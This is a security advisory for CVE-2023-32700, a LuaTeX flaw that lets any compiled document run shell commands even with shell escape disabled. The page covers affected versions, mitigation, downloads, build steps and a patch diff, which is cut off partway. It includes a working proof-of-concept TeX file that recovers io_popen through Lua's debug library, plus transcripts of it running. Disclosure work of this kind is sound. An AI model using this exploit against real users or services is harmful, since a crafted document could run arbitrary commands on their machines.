---
title: LuaTeX Security Vulnerabilities
date: "2023-05-20"
description: >-
    Any document compiled with older versions of LuaTeX can execute
    arbitrary shell commands, even with shell escape disabled.

    This affects LuaTeX versions 1.04–1.16.1, which were included in
    TeX Live 2017–2022 as well as the original release of TeX Live 2023.
    This issue was fixed in LuaTeX 1.17.0, and is distributed as an
    update to TeX Live 2023.
---

{{- /* Source Code for maxchernoff.ca
     https://github.com/gucci-on-fleek/maxchernoff.ca
     SPDX-License-Identifier: MPL-2.0+ OR CC-BY-SA-4.0+
     SPDX-FileCopyrightText: 2024 Max Chernoff */ -}}

<style>
th {
  text-align: right;
  font-weight: normal;
}

thead th {
  font-weight: bold;
}

code .token.url {
  text-decoration: underline;
}

code .token.comment,
code .token.cdata {
  color: hsl(210, 13%, 31%);
}

code .token.punctuation,
code .token.operator {
  color: hsl(0, 10%, 33%);
}

code .token.selector,
code .token.inserted,
code .token.string {
  color: hsl(80, 100%, 17%);
}

code .token.keyword,
code .token.variable:not(.parameter),
code .token.shell-symbol {
  color: hsl(198, 100%, 23%);
}

code .token.function,
code .token.deleted,
code .token.class-name {
  color: hsl(348, 100%, 32%);
}

code .token.bash {
  font-weight: 500;
}

code .token.shell-symbol,
code .token.prefix,
code .token.coord {
  font-weight: 700;
}

code .token.shell-symbol {
  user-select: none;
}

@media (prefers-color-scheme: dark) {
  code .token.comment,
  code .token.cdata {
    color: hsl(210, 13%, 65%);
  }

  code .token.punctuation,
  code .token.operator {
    color: hsl(0, 10%, 66%);
  }

  code .token.selector,
  code .token.inserted,
  code .token.string {
    color: hsl(80, 100%, 65%);
  }

  code .token.keyword,
  code .token.variable:not(.parameter),
  code .token.shell-symbol {
    color: hsl(198, 100%, 67%);
  }

  code .token.function,
  code .token.deleted,
  code .token.class-name {
    color: hsl(348, 100%, 74%);
  }
}
</style>

<h2 id="summary">Summary</h2>

<p>Any document compiled with older versions of LuaTeX can execute arbitrary
shell commands, even with shell escape disabled.</p>

<p>This affects LuaTeX versions 1.04–1.16.1, which were included in TeX Live
2017–2022 as well as the original release of TeX Live 2023. This issue was fixed
in LuaTeX 1.17.0, and is distributed as an update to TeX Live 2023.</p>

<p>This issue has been assigned
<a href="https://www.cve.org/CVERecord?id=CVE-2023-32700">CVE-2023-32700</a>.
</p>

<h3 id="exploit-code">Exploit Code</h3>

<p>To see if you are vulnerable, you may use the below sample document:</p>

<h4 id="tex-file">TeX File</h4>

<pre><code><span class="token comment">% shell-escape-test.tex</span>
<span class="token function selector">\directlua</span><span class="token punctuation">{</span>
    <span class="token keyword">local</span> <span class="token keyword">function</span> <span class="token function">get_upvalue</span><span class="token punctuation">(</span>func<span class="token punctuation">,</span> name<span class="token punctuation">)</span>
        <span class="token keyword">local</span> nups <span class="token operator">=</span> debug<span class="token punctuation">.</span><span class="token function">getinfo</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">.</span>nups

        <span class="token keyword">for</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> nups <span class="token keyword">do</span>
            <span class="token keyword">local</span> current<span class="token punctuation">,</span> value <span class="token operator">=</span> debug<span class="token punctuation">.</span><span class="token function">getupvalue</span><span class="token punctuation">(</span>func<span class="token punctuation">,</span> i<span class="token punctuation">)</span>
            <span class="token keyword">if</span> current <span class="token operator">==</span> name <span class="token keyword">then</span>
                <span class="token keyword">return</span> value
            <span class="token keyword">end</span>
        <span class="token keyword">end</span>
    <span class="token keyword">end</span>

    <span class="token keyword">local</span> outer <span class="token operator">=</span> <span class="token function">get_upvalue</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>popen<span class="token punctuation">,</span> <span class="token string">"popen"</span><span class="token punctuation">)</span>
    <span class="token keyword">local</span> popen <span class="token operator">=</span> <span class="token function">get_upvalue</span><span class="token punctuation">(</span>outer <span class="token keyword">or</span> io<span class="token punctuation">.</span>popen<span class="token punctuation">,</span> <span class="token string">"io_popen"</span><span class="token punctuation">)</span>

    <span class="token function">print</span><span class="token punctuation">(</span><span class="token function">popen</span><span class="token punctuation">(</span>arg<span class="token punctuation">[</span><span class="token function">rawlen</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token string">"*a"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token function selector">\csname</span>@@end<span class="token function selector">\endcsname</span>
<span class="token function selector">\end</span>
</code></pre>

<h4 id="vulnerable-transcripts">Vulnerable Transcripts</h4>
<pre><code><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">lualatex shell-escape-test.tex <span class="token string">"sh -c 'echo @@@VULNERABLE@@@'"</span></span></span>
<span class="token output">This is LuaHBTeX, Version 1.16.0 (TeX Live 2023)
 restricted system commands enabled.
(./shell-escape-test.tex
LaTeX2e &lt;2022-11-01> patch level 1
 L3 programming layer &lt;2023-04-20><u class="token function">@@@VULNERABLE@@@</u>

)
 296 words of node memory still in use:
   1 hlist, 3 kern, 1 glyph, 1 attribute, 39 glue_spec, 1 attribute_list nodes
   avail lists: 2:10,3:3,4:1,5:1

warning  (pdf backend): no pages of output.
Transcript written on shell-escape-test.log.

</span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">luatex shell-escape-test.tex <span class="token string">"sh -c 'echo @@@VULNERABLE@@@'"</span></span></span>
<span class="token output">This is LuaTeX, Version 1.16.0 (TeX Live 2023)
 restricted system commands enabled.
(./shell-escape-test.tex<u class="token function">@@@VULNERABLE@@@</u>

)
warning  (pdf backend): no pages of output.
Transcript written on shell-escape-test.log.
</span></code></pre>

<h4 id="safe-transcripts">Safe Transcripts</h4>
<pre><code><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">lualatex shell-escape-test.tex <span class="token string">"sh -c 'echo @@@VULNERABLE@@@'"</span></span></span>
<span class="token output">This is LuaHBTeX, Version 1.17.0 (TeX Live 2024)
 restricted system commands enabled.
(./shell-escape-test.tex
LaTeX2e &lt;2022-11-01> patch level 1
 L3 programming layer &lt;2023-04-20>[\directlua]:1: attempt to call a nil value (local 'popen')
stack traceback:
	[\directlua]:1: in main chunk.
l.17 }

? )
 296 words of node memory still in use:
   1 hlist, 3 kern, 1 glyph, 1 attribute, 39 glue_spec, 1 attribute_list nodes
   avail lists: 2:10,3:3,4:1,5:1

warning  (pdf backend): no pages of output.
Transcript written on shell-escape-test.log.

</span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">luatex shell-escape-test.tex <span class="token string">"sh -c 'echo @@@VULNERABLE@@@'"</span></span></span>
<span class="token output">This is LuaTeX, Version 1.17.0 (TeX Live 2024)
 restricted system commands enabled.
(./shell-escape-test.tex[\directlua]:1: attempt to call a nil value (local 'popen')
stack traceback:
	[\directlua]:1: in main chunk.
l.17 }

? )
warning  (pdf backend): no pages of output.
Transcript written on shell-escape-test.log.
</span></code></pre>

<nav>
<h2>Contents</h2>
<ul>
    <li><a href="#summary">Summary</a>
        <ul>
        <li><a href="#exploit-code">Exploit Code</a>
        <ul>
            <li><a href="#tex-file">TeX File</a></li>
            <li><a href="#vulnerable-transcripts">Vulnerable Transcripts</a></li>
            <li><a href="#safe-transcripts">Safe Transcripts</a></li>
        </ul>
        </li>
        </ul>
    </li>
    <li><a href="#details">Details</a>
    <ul>
        <li><a href="#affected-configurations">Affected Configurations</a>
        <ul>
            <li><a href="#luatex">LuaTeX</a></li>
            <li><a href="#distributions">Distributions</a></li>
            <li><a href="#formats">Formats</a></li>
            <li><a href="#os">Operating Systems and Architectures</a></li>
            <li><a href="#flags">Command-line Flags</a></li>
        </ul>
        </li>
        <li><a href="#exploitation-requirements">Exploitation Requirements</a></li>
        <li><a href="#solution">Solution</a>
        <ul>
            <li><a href="#easy">The Easy Way</a></li>
            <li><a href="#old-tl">TeX Live ≤ 2022</a></li>
            <li><a href="#source">Build from Source</a></li>
            <li><a href="#patching">Patching Older Versions</a></li>
            <li><a href="#patches-for-specific">Patches for Specific Versions</a></li>
            <li><a href="#binary-details">Binary Compilation Details</a></li>
            <li><a href="#patching-no-bin">Patching <em>Without</em> Modifying Binaries</a></li>
        </ul>
        </li>
        <li><a href="#impact">Impact</a></li>
        <li><a href="#impact">How it Works</a>
        <ul>
            <li><a href="#the-exploit">The Exploit</a></li>
            <li><a href="#the-fix">The Fix</a></li>
        </ul>
        </li>
    </ul>
    </li>
    <li><a href="#additional-issues">Additional Issues</a>
    <ul>
        <li><a href="#debug-module"><code>debug</code> Module still Available with <code>--safer</code></a></li>
        <li><a href="#luasocket"><code>luasocket</code> Enabled by Default</a>
        <ul>
            <li><a href="#socket-summary">Summary</a></li>
            <li><a href="#socket-details">Details</a></li>
            <li><a href="#socket-solution">Solution</a></li>
            <li><a href="#socket-context">ConTeXt</a></li>
        </ul>
        </li>
    </ul>
    </li>
    <li><a href="#timeline">Timeline</a></li>
    <li><a href="#credits">Credits</a></li>
    <li><a href="#contact">Contact</a></li>
</ul>
</nav>

<h2 id="details">Details</h2>

<h3 id="affected-configurations">Affected Configurations</h3>

<h4 id="luatex">LuaTeX</h4>

<p>LuaTeX versions 1.04–1.16.1 are affected by this vulnerability.</p>

<p>LuaTeX versions 1.17.0 (2023-04-29) and newer are <em>not</em> affected by
this vulnerability. LuaTeX versions prior to and including 1.03 (2017-02-16) are
also not affected.</p>

<p>If you have an unversioned LuaTeX built from source, commit
<code><a href="https://gitlab.lisn.upsaclay.fr/texlive/luatex/-/commit/4d8b815d">4d8b815d</a></code>
introduced the issue on 2017-03-01, and commits
<a href="https://gitlab.lisn.upsaclay.fr/texlive/luatex/-/commit/5650c067">5650c067</a></code>
and
<a href="https://gitlab.lisn.upsaclay.fr/texlive/luatex/-/commit/b8b71a25">b8b71a25</a></code>
resolved the issue on 2023-04-24.</p>

<p>This vulnerability affects all 4 LuaTeX engines: LuaTeX, LuaHBTeX, LuaJITTeX,
and LuaJITHBTeX.</p>

<h4 id="distributions">Distributions</h4>

<p>This issue affects TeX Live 2017–2022 and the original release of TeX Live
2023. Beginning on 2023-05-02, TeX Live 2023 distributed the latest version of
LuaTeX that is not vulnerable to this issue.</p>

<p>This issue also affects MiKTeX 2.9.6300–23.4. On 2023-05-05, MiKTeX 23.5
distributed the latest version of LuaTeX that is not vulnerable to this
issue.</p>

<p>Other unnamed distributions are also affected. To check if your specific
installation is affected, check <code>luatex --version</code> or test <a
href="#exploit-code">the exploit code</a>.</p>

<h4 id="formats">Formats</h4>

<p>Plain LuaTeX, LuaLaTeX, and OpTeX are all affected by this vulnerability.</p>

<p>ConTeXt is <em>not</em> affected by this vulnerability since it
<em>always</em> has shell-escape enabled.</p>

<h4 id="os">Operating Systems and Architectures</h4>

<p>This vulnerability affects all operating systems and architectures.</p>

<h4 id="flags">Command-line Flags</h4>

<p>All of <code><i>LUATEX</i></code> (default), <code><i>LUATEX</i>
--no-shell-escape</code>, and <code><i>LUATEX</i> --shell-restricted</code>
are vulnerable.

<span class="sidenote">
    <code><i>LUATEX</i></code> can be any of <code>luatex</code>,
    <code>lualatex</code>, <code>luahbtex</code>, <code>optex</code>, etc.
</span>
</p>

<p><code><i>LUATEX</i> --safer</code> is <em>not</em> vulnerable; however
running with <code>--safer</code> disables loading
<abbr>TTF</abbr>/<abbr>OTF</abbr> fonts (via
<code>luaotfload</code>/<code>fontspec</code>), thus negating one of the primary
benefits of using LuaTeX. As such, exceedingly few users typically run LuaTeX
using with <code>--safer</code>.</p>

<h3 id="exploitation-requirements">Exploitation Requirements</h3>
<p>In order to exploit this vulnerability, an attacker will generally need to
convince a user to compile (run) a malicious document using a vulnerable LuaTeX
version. An alternate attack would require the user to compile <em>any</em>
document in an attacker-controlled working directory.</p>

<p>LuaTeX has been included in all major TeX distributions since 2008, and most
extant versions of LuaTeX are vulnerable, so the technical requirements will
generally be met by all (La)TeX users. Users also typically assume that
compiling an unknown TeX document is safe (similar to how opening an unknown
<abbr>PDF</abbr> document is safe), so an attacker should be able to easily
persuade a potential victim to compile a malicious document.</p>

<p>Many online services (<a href="https://www.overleaf.com/">Overleaf</a>,
<a href="https://cocalc.com/features/latex-editor">CoCalc</a>,
<a href="https://latex.codecogs.com/eqneditor/editor.php">CodeCogs</a>, etc.) allow
untrusted users to compile arbitrary documents; however, most of these services
are either pdfTeX-only or use additional sandboxing, so they should be
unaffected by this issue.</p>

<p><a href="https://texlive.net/run"><code>texlive.net</code></a>
<em>was</em> initially vulnerable to this issue. Before this vulnerability was
publicly disclosed, I privately emailed the maintainers and the issue was
quickly fixed. There are a few other vulnerable online services, but these are
quite rare in comparison to the safe ones.</p>

<h3 id="solution">Solution</h3>

<h4 id="easy">The Easy Way</h4>

<p>If you are using TeX Live 2023 or MiKTeX, you can simply update your
distribution to install the patched version of LuaTeX.</p>

<p>If you are using a LuaTeX packaged by a Linux or <abbr>BSD</abbr>
distribution, then updating your distribution should get you a patched version
of LuaTeX. If this is not the case, then please point your distribution
maintainers to this page.</p>

<h4 id="old-tl">TeX Live ≤ 2022</h4>

<p>If you are using an older version of TeX Live, then you should ideally
upgrade to TeX Live 2023. If this is not possible, then you can manually
install updated LuaTeX binaries.</p>

<p>If you’re using Linux <code>x86_64</code> or Windows, then you can download
specifically-patched binaries in <a href="#patches-for-specific">the next
section</a>.</p>

<p>Otherwise, you can use the latest binaries from TeX Live 2023. Using newer
binaries with older TeX Live <code>TEXMF</code> trees will generally work
without causing any issues; however, there may be some backwards
incompatibilities depending on old your TeX installation is.</p>

<ol>
    <li style="overflow-x: auto; list-style-position: inside;">Download the appropriate files for your operating system and architecture
        <table>
            <thead><th><abbr>OS</abbr>/architecture</th><th colspan="3" style="text-align: center;">Download Links</th></thead><tbody>
            <tr><th>Linux <abbr>ARM</abbr>64</th><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luatex.aarch64-linux.tar.xz">LuaTeX</a></td><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luahbtex.aarch64-linux.tar.xz">LuaHBTeX</a></td><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luajittex.aarch64-linux.tar.xz">LuaJITTeX</a></td></tr>
            <tr><th>Linux <abbr>ARMHF</abbr></th><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luatex.amd64-netbsd.tar.xz">LuaTeX</a></td><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luahbtex.amd64-netbsd.tar.xz">LuaHBTeX</a></td><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luajittex.amd64-netbsd.tar.xz">LuaJITTeX</a></td></tr>
            <tr><th>Linux x86</th><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luatex.i386-linux.tar.xz">LuaTeX</a></td><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luahbtex.i386-linux.tar.xz">LuaHBTeX</a></td><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luajittex.i386-linux.tar.xz">LuaJITTeX</a></td></tr>
            <tr><th>Linux x86_64</th><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luatex.x86_64-linux.tar.xz">LuaTeX</a></td><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luahbtex.x86_64-linux.tar.xz">LuaHBTeX</a></td><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luajittex.x86_64-linux.tar.xz">LuaJITTeX</a></td></tr>
            <tr><th>Linux x86_64 <abbr>musl<abbr></abbr></th><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luatex.x86_64-linuxmusl.tar.xz">LuaTeX</a></td><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luahbtex.x86_64-linuxmusl.tar.xz">LuaHBTeX</a></td><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luajittex.x86_64-linuxmusl.tar.xz">LuaJITTeX</a></td></tr>
            <tr><th>Free<abbr>BSD</abbr> x86_64</th><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luatex.amd64-freebsd.tar.xz">LuaTeX</a></td><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luahbtex.amd64-freebsd.tar.xz">LuaHBTeX</a></td><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luajittex.amd64-freebsd.tar.xz">LuaJITTeX</a></td></tr>
            <tr><th>Free<abbr>BSD</abbr> x86</th><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luatex.i386-freebsd.tar.xz">LuaTeX</a></td><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luahbtex.i386-freebsd.tar.xz">LuaHBTeX</a></td><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luajittex.i386-freebsd.tar.xz">LuaJITTeX</a></td></tr>
            <tr><th>Net<abbr>BSD</abbr> x86_64</th><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luatex.amd64-netbsd.tar.xz">LuaTeX</a></td><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luahbtex.amd64-netbsd.tar.xz">LuaHBTeX</a></td><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luajittex.amd64-netbsd.tar.xz">LuaJITTeX</a></td></tr>
            <tr><th>Net<abbr>BSD</abbr> x86</th><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luatex.i386-netbsd.tar.xz">LuaTeX</a></td><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luahbtex.i386-netbsd.tar.xz">LuaHBTeX</a></td><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luajittex.i386-netbsd.tar.xz">LuaJITTeX</a></td></tr>
            <tr><th>Solaris x86</th><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luatex.i386-solaris.tar.xz">LuaTeX</a></td><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luahbtex.i386-solaris.tar.xz">LuaHBTeX</a></td><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luajittex.i386-solaris.tar.xz">LuaJITTeX</a></td></tr>
            <tr><th>Solaris x86_64</th><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luatex.x86_64-solaris.tar.xz">LuaTeX</a></td><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luahbtex.x86_64-solaris.tar.xz">LuaHBTeX</a></td><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luajittex.x86_64-solaris.tar.xz">LuaJITTeX</a></td></tr>
            <tr><th>macOS x86_64/<abbr>ARM</abbr>64</th><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luatex.universal-darwin.tar.xz">LuaTeX</a></td><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luahbtex.universal-darwin.tar.xz">LuaHBTeX</a></td><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luajittex.universal-darwin.tar.xz">LuaJITTeX</a></td></tr>
            <tr><th>Windows x86_64</th><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luatex.windows.tar.xz">LuaTeX</a></td><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luahbtex.windows.tar.xz">LuaHBTeX</a></td><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luajittex.windows.tar.xz">LuaJITTeX</a></td></tr>
            <tr><th>Windows x86</th><td><a href="https://tug.org/texlive/files/w32-luatex-1.17.0-tl23/luatex.exe">LuaTeX</a></td><td><a href="https://tug.org/texlive/files/w32-luatex-1.17.0-tl23/luahbtex.exe">LuaHBTeX</a></td><td><a href="https://tug.org/texlive/files/w32-luatex-1.17.0-tl23/luajittex.exe">LuaJITTeX</a></td></tr>
            <tr><th>Cygwin x86_64</th><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luatex.x86_64-cygwin.tar.xz">LuaTeX</a></td><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luahbtex.x86_64-cygwin.tar.xz">LuaHBTeX</a></td><td><a href="https://mirrors.ctan.org/systems/texlive/tlnet/archive/luajittex.x86_64-cygwin.tar.xz">LuaJITTeX</a></td></tr>
        </tbody></table></li>
    <li>Unpack the archives in <code>$TEXMFDIST</code>. You can get the exact location by running
<pre><code><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">kpsewhich --var-value<span class="token operator">=</span>TEXMFDIST</span></span>
</code></pre>
    Ensure that you <em>overwrite</em> the files <code>luatex</code>, <code>luahbtex</code>, and <code>luajitex</code>.</li>
    <li>Rebuild the format files:
        <pre><code><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">fmtutil-sys <span class="token parameter variable">--all</span></span></span></code></pre>
    </li>
    <li>Verify that you have at least version 1.17.0 for all four commands:
    <pre><code><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">luatex <span class="token parameter variable">--version</span></span></span>
<span class="token output">This is LuaTeX, Version 1.17.0 (TeX Live 2023)
[...]

</span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">luahbtex <span class="token parameter variable">--version</span></span></span>
<span class="token output">This is LuaHBTeX, Version 1.17.0 (TeX Live 2023)
[...]

</span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">luajittex <span class="token parameter variable">--version</span></span></span>
<span class="token output">This is LuajitTeX, Version 1.17.0 (TeX Live 2023)
Development id: 7581
[...]

</span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">luajithbtex <span class="token parameter variable">--version</span>  <span class="token comment"># (optional)</span></span></span>
<span class="token output">This is LuajitHBTeX, Version 1.17.0 (TeX Live 2023)
Development id: 7581
[...]
</span></code></pre></li></ol>

<h4 id="source">Build from Source</h4>

<p>The first step is to download the source.</p>

<pre><code><span class="token output">(Option 1)
</span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">mkdir</span> tl2023</span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">rsync</span> <span class="token parameter variable">-a</span> <span class="token parameter variable">--delete</span> <span class="token parameter variable">--exclude</span><span class="token operator">=</span>.svn <span class="token parameter variable">--exclude</span><span class="token operator">=</span>Work <span class="token parameter variable">--exclude</span><span class="token operator">=</span>inst tug.org::tlbranch ./tl2023</span></span>

<span class="token output">(Option 2)
</span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">wget</span> <span class="token string">'<a href="https://github.com/TeX-Live/texlive-source/archive/refs/tags/build-svn66984.tar.gz">https://github.com/TeX-Live/texlive-source/archive/refs/tags/build-svn66984.tar.gz</a>'</span></span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">tar</span> xf build-svn66984.tar.gz</span></span>
</code></pre>

<p>Next, you can build the source. If you have previously built TeX Live, then
you can follow the
<a href="https://tug.org/pipermail/tlbuild/2023q2/005325.html">brief
instructions from <code>tlbuild</code></a>. Otherwise, you can find full instructions
on the <a href="https://tug.org/texlive/build.html">“TeX Live build procedure”</a>
page.</p>

<p>If you have no experience building TeX Live, then you may find it easier to
build LuaTeX alone. To do so, you can follow the simplified procedure below:</p>

<pre><code><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">git</span> clone <span class="token parameter variable">--depth</span> <span class="token number">1</span> https://gitlab.lisn.upsaclay.fr/texlive/luatex.git</span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token builtin class-name">cd</span> luatex</span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">git</span> checkout <span class="token number">1.17</span>.0</span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">./build.sh <span class="token parameter variable">--parallel</span> <span class="token parameter variable">--luahb</span> <span class="token parameter variable">--jit</span> <span class="token parameter variable">--jithb</span></span></span>
<span class="token command"><span class="token shell-symbol important">#</span> <span class="token bash language-bash"><span class="token function">cp</span> build/texk/web2c/luatex build/texk/web2c/luahbtex build/texk/web2c/luajittex build/texk/web2c/luajithbtex <span class="token string">"<span class="token variable"><span class="token variable">$(</span>kpsewhich --var-value<span class="token operator">=</span>SELFAUTOLOC<span class="token variable">)</span></span>"</span></span></span>
<span class="token command"><span class="token shell-symbol important">#</span> <span class="token bash language-bash">fmtutil-sys <span class="token parameter variable">--all</span></span></span>
</code></pre>

<h4 id="patching">Patching Older Versions</h4>

<p>If you are using an older version of LuaTeX and need to maintain absolute
backwards compatibility, then you can apply the following patches to your
LuaTeX source:</p>

<pre class="scroll"><code>diff --git a/source/texk/web2c/luatexdir/lua/loslibext.c b/source/texk/web2c/luatexdir/lua/loslibext.c
<span class="token coord">--- a/source/texk/web2c/luatexdir/lua/loslibext.c</span>
<span class="token coord">+++ b/source/texk/web2c/luatexdir/lua/loslibext.c</span>
@@ -1047,6 +1047,111 @@ static int os_execute(lua_State * L)
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">}
</span><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">/*
</span><span class="token prefix inserted">+</span><span class="token line">** ======================================================
</span><span class="token prefix inserted">+</span><span class="token line">** l_kpse_popen spawns a new process connected to the current
</span><span class="token prefix inserted">+</span><span class="token line">** one through the file streams with some checks by kpse.
</span><span class="token prefix inserted">+</span><span class="token line">** Almost verbatim from Lua liolib.c .
</span><span class="token prefix inserted">+</span><span class="token line">** =======================================================
</span><span class="token prefix inserted">+</span><span class="token line">*/
</span><span class="token prefix inserted">+</span><span class="token line">#if !defined(l_kpse_popen)           /* { */
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">#if defined(LUA_USE_POSIX)      /* { */
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">#define l_kpse_popen(L,c,m)          (fflush(NULL), popen(c,m))
</span><span class="token prefix inserted">+</span><span class="token line">#define l_kpse_pclose(L,file)        (pclose(file))
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">#elif defined(LUA_USE_WINDOWS)  /* }{ */
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">#define l_kpse_popen(L,c,m)          (_popen(c,m))
</span><span class="token prefix inserted">+</span><span class="token line">#define l_kpse_pclose(L,file)        (_pclose(file))
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">#else                           /* }{ */
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">/* ISO C definitions */
</span><span class="token prefix inserted">+</span><span class="token line">#define l_kpse_popen(L,c,m)  \
</span><span class="token prefix inserted">+</span><span class="token line">          ((void)((void)c, m), \
</span><span class="token prefix inserted">+</span><span class="token line">          luaL_error(L, "'popen' not supported"), \
</span><span class="token prefix inserted">+</span><span class="token line">          (FILE*)0)
</span><span class="token prefix inserted">+</span><span class="token line">#define l_kpse_pclose(L,file)                ((void)L, (void)file, -1)
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">#endif                          /* } */
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">#endif                          /* } */
</span><span class="token prefix inserted">+</span><span class="token line">typedef luaL_Stream LStream;
</span><span class="token prefix inserted">+</span><span class="token line">#define tolstream(L)    ((LStream *)luaL_checkudata(L, 1, LUA_FILEHANDLE))
</span><span class="token prefix inserted">+</span><span class="token line">static LStream *newprefile (lua_State *L) {
</span><span class="token prefix inserted">+</span><span class="token line">  LStream *p = (LStream *)lua_newuserdata(L, sizeof(LStream));
</span><span class="token prefix inserted">+</span><span class="token line">  p->closef = NULL;  /* mark file handle as 'closed' */
</span><span class="token prefix inserted">+</span><span class="token line">  luaL_setmetatable(L, LUA_FILEHANDLE);
</span><span class="token prefix inserted">+</span><span class="token line">  return p;
</span><span class="token prefix inserted">+</span><span class="token line">}
</span><span class="token prefix inserted">+</span><span class="token line">static int io_kpse_pclose (lua_State *L) {
</span><span class="token prefix inserted">+</span><span class="token line">  LStream *p = tolstream(L);
</span><span class="token prefix inserted">+</span><span class="token line">  return luaL_execresult(L, l_kpse_pclose(L, p->f));
</span><span class="token prefix inserted">+</span><span class="token line">}
</span><span class="token prefix inserted">+</span><span class="token line">static int io_kpse_check_permissions(lua_State *L) {
</span><span class="token prefix inserted">+</span><span class="token line">    const char *filename = luaL_checkstring(L, 1);
</span><span class="token prefix inserted">+</span><span class="token line">    if (filename == NULL) {
</span><span class="token prefix inserted">+</span><span class="token line">        lua_pushboolean(L,0);
</span><span class="token prefix inserted">+</span><span class="token line">        lua_pushliteral(L,"no command name given");
</span><span class="token prefix inserted">+</span><span class="token line">    } else if (shellenabledp &lt;= 0) {
</span><span class="token prefix inserted">+</span><span class="token line">        lua_pushboolean(L,0);
</span><span class="token prefix inserted">+</span><span class="token line">        lua_pushliteral(L,"all command execution is disabled");
</span><span class="token prefix inserted">+</span><span class="token line">    } else if (restrictedshell == 0) {
</span><span class="token prefix inserted">+</span><span class="token line">        lua_pushboolean(L,1);
</span><span class="token prefix inserted">+</span><span class="token line">        lua_pushstring(L,filename);
</span><span class="token prefix inserted">+</span><span class="token line">    } else {
</span><span class="token prefix inserted">+</span><span class="token line">        char *safecmd = NULL;
